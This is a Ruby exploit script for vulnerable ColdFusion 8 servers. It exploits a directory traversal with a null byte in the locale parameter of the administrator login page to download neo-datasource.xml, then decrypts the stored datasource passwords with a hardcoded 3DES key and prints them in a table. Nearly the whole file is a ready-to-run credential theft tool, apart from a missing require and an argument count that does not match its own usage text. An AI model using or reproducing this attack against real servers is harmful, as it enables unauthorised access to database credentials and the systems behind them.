#!/usr/bin/env ruby


require 'rexml/document'
require 'rextable'
require 'openssl'
require 'base64'

def usage
    puts "cfneo.rb downloads the neo-datasource.xml file from a vulnerable"
	puts "ColdFusion server then parses the file to find the encrypted"
    puts "passwords. The passwords are decrypted and written to stdout."
    puts
    puts "Usage: cfneo.rb server port"
end

def decrypt(cpass)
	des = OpenSSL::Cipher::Cipher.new('des-ede3')
    des.decrypt
    des.key = '0yJ!@1$r8p0L@r1$6yJ!@1rj'
    return des.update(Base64.decode64(cpass)) + des.final
end

def get_passwords(data)
	pwds = Array.new
    data.scan(/\<string\>([a-zA-Z0-9\+\/]+[=]+)\<\/string>/m) do |m|
        pwds << m[0]
	end
    return pwds
end

def download_file(server, port)
	http = Net::HTTP.new(server, port)
	if port == 443 then http.use_ssl = true end

	# These may have to be changed based on the details of the vulnerability
	path = '/CFIDE/administrator/enter.cfm'
	locale = 'locale=../../../../../../../../../../ColdFusion8/lib/neo-datasource.xml%00en'

	# Use the directory traversal to get the neo-datasoure.xml file
	headers = {
		'Host' => server,
		'Content-Type' => 'application/x-www-form-urlencoded',
		'Content-Length' => locale.length.to_s,
	}

	resp, data = http.post(path, locale, headers)
	data =~ /\<title\>(.*)\<\/title\>/m
	return $1
end

#-----------------------------------------------------------------------------
# MAIN
#-----------------------------------------------------------------------------
if ARGV.length < 3 then
    usage
    exit(1)
end

data = download_file(ARGV[0], ARGV[1].to_i)
passwords = get_passwords(data)
tbl = RexTable::Table.new('Columns' => ["Encrypted", "Decrypted"],
			'Header'=> 'Passwords')

passwords.each do |p|
	tbl << [p, decrypt(p)]
end

puts tbl.to_s
